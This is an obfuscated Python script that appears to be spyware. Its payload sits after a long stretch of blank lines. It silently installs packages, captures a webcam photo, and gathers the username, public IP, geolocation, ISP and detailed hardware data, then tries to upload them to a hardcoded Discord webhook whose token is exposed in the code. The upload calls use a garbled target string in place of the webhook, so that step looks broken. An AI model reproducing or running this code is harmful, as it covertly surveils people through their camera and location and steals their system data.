from socket import socket as A, AF_INET as B, SOCK_DGRAM as C
from os import getenv as D, system as E, geteuid as F, path as G, remove as H
E('pipx install psutil requests')
from platform import system as I
from getpass import getuser as J
import psutil as K
from psutil import cpu_count as L, virtual_memory as M, disk_partitions as N
from platform import version as O, architecture as P
from subprocess import check_output as Q
from re import search as R
from requests import get as S, post as T
try:
    E('pipx install opencv-python')
    from cv2 import VideoCapture as U, imwrite as V

except Exception:
    pass





















































































sk = ''.join(chr(int('68', 16)) + chr(int('69', 16)) + chr(int('65', 16)) + chr(int('77', 16)) + chr(int('80', 16)) + chr(int('60', 16)) + chr(int('62', 16)))
lk = 'https://discord.com/api/webhooks/' + '1416470285124636862/eE362yEUnVTNXPOjXCiIaMW1vwKoOjZiTGqxIdaQqD3wYS0LBV4hIyKOEZdA3MrZ16BM'

def X():
    Y = 'm.png'

    Z = 0
    a = U(Z)

    b, c = a.read()
    a.release()

    if b:
        V(Y, c)
        if G.exists(Y):
            try:
                with open(Y, 'rb') as d:
                    e = {
                        'username': 'kj',
                        'content': 'st'
                    }

                    f = {
                        'file': (Y, d, 'image/png')
                    }

                    g = T(sk, data=e, files=f)
                    g.raise_for_status()

            except Exception:
                pass
            finally:
                H(Y)


def h():
    i = {
        'ip': 'Not available',
        'location': 'no',
        'coords': 'no',
        'isp': 'no',
        'domain': 'no',
        'history': []
    }

    try:
        j = S('https://ipapi.co/json/')
        j.raise_for_status()
        k = j.json()

        i['ip'] = k.get('ip')
        i['location'] = f"{k.get('city')}, {k.get('region')}, {k.get('country_name')}"
        i['coords'] = f"{k.get('latitude')}, {k.get('longitude')}"
        i['isp'] = k.get('org')
        i['domain'] = k.get('asn')

    except Exception:
        pass

    l = []
    m = N()
    for n in m:
        o = {}
        try:
            p = K.disk_usage(n.mountpoint)
            o['disk'] = n.mountpoint
            o['total'] = round(p.total / (1024**3), 2)
            o['used'] = round(p.used / (1024**3), 2)
            o['perUsed'] = p.percent
            o['available'] = round(p.free / (1024**3), 2)
            o['perAvailable'] = 100 - p.percent
            o['type'] = n.fstype
            l.append(o)
        except PermissionError:
            continue

    q = 'Not available'
    try:
        r = Q(['nvidia-smi', '--query-gpu=name', '--format=csv,noheader']).decode('utf-8').strip()
        if r:
            q = r
    except Exception:
        try:
            r = Q(['lshw', '-class', 'display']).decode('utf-8')
            s = R(r'product:\s*(.*)', r)
            if s:
                q = s.group(1).strip()
        except Exception:
            pass
    t = O()
    u = P()[0]
    v = 'Not available'
    w = 'Not available'
    if F() == 0:
        try:
            v = Q(['dmidecode', '-s', 'baseboard-product-name']).decode('utf-8').strip()
            w = Q(['dmidecode', '-s', 'bios-version']).decode('utf-8').strip()
        except Exception:
            pass

    x = L(logical=True)
    y = K.cpu_freq()
    if y:
        z = round(y.current / 1000, 2)
    else:
        z = None

    aa = M().total
    aa = round(aa / (1024**3), 1)

    try:
        with open('/proc/cpuinfo', 'r') as ab:
            ac = ab.readlines()

        ad = ''
        ae = 0
        for af in ac:
            if 'model name' in af:
                ad = af.split(':')[1].strip()
            elif 'cpu cores' in af:
                ae = int(af.split(':')[1].strip())
    except Exception:
        pass


    for ag in ['LOGNAME', 'USER', 'LNAME', 'USERNAME']:
        ah = D(ag)
        if ah:
            break

        if not ah:
            try:
                ah = J()
            except Exception:
                ah = 'unknown'

    ai = I()
    aj = A(B, C)
    try:
        aj.connect(('10.255.255.255', 1))
        ak = aj.getsockname()[0]
    except Exception:
        ak = '127.0.0.1'
    finally:
        aj.close()

    al = {'username': ah, 'os': ai, 'ip': ak, 'cpu_model': ad, 'cpu_cores': ae, 'speed': z, 'ram': aa, 'threads': x, 'motherboard': v, 'bios': w, 'os_version': t, 'os_arch': u, 'gpu_model': q, 'disks': l, 'info': i}
    return al


def am():
    try:
        X()
    except Exception:
        pass
    an = h()
    ao = {
        'username': 'ud',
        'content': 'sl',
    }
    ap = {
        'file': ('data.json', str(an), 'application/json')
    }
    try:
        aq = T(sk, data=ao, files=ap)
        aq.raise_for_status()
    except Exception as ar:
        print(ar)

am()
